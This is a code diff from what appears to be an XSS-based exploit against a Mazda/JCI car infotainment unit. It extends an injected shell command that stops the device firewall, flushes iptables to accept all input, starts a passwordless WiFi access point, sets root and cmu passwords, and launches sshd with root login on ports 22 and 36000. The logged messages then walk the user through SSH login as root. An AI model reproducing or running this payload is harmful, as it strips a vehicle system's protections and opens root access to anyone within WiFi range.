@@ -10,7 +10,7 @@
     function enableSSH(view) {
         xssLog(view, '<b>=== SSH Enable (No-XHR) ===</b>')
 
-        var sshCmd = '/usr/sbin/sshd; echo "root:mazda" | chpasswd; echo "cmu:jci" | chpasswd'
+        var sshCmd = '[ -f /jci/scripts/jci-fw.sh ] && /jci/scripts/jci-fw.sh stop; iptables -F 2>/dev/null; iptables -P INPUT ACCEPT 2>/dev/null; [ -f /jci/scripts/jci-wifiap.sh ] && /jci/scripts/jci-wifiap.sh start; echo "root:mazda" | chpasswd; echo "cmu:jci" | chpasswd; killall -9 sshd 2>/dev/null; /usr/sbin/sshd -p 22 -p 36000 -o PasswordAuthentication=yes -o PermitRootLogin=yes'
         var mounts = ['/tmp/mnt/sda1', '/tmp/mnt/sdb1', '/tmp/mnt/sdc1']
         var scriptCmd = ''
         for (var m = 0; m < mounts.length; m++) {
@@ -86,9 +86,9 @@
         xssLog(view, '[6/6] Skipped location redirect (would lose UI)')
         xssLog(view, '')
         xssLog(view, '<b>Wait 5 sec then check SSH:</b>')
-        xssLog(view, 'WiFi: MAZDA-xxx')
-        xssLog(view, 'ssh root@192.168.53.1 pass:mazda')
-        xssLog(view, 'ssh cmu@192.168.53.1 pass:jci')
+        xssLog(view, 'WiFi AP: CMU-* (No password)')
+        xssLog(view, 'ssh root@192.168.53.1 (or -p 36000) pass:mazda')
+        xssLog(view, 'ssh cmu@192.168.53.1 (or -p 36000) pass:jci')
 
         // Method 6b: Try relative paths (page might be served from /jci/...)
         xssLog(view, '')
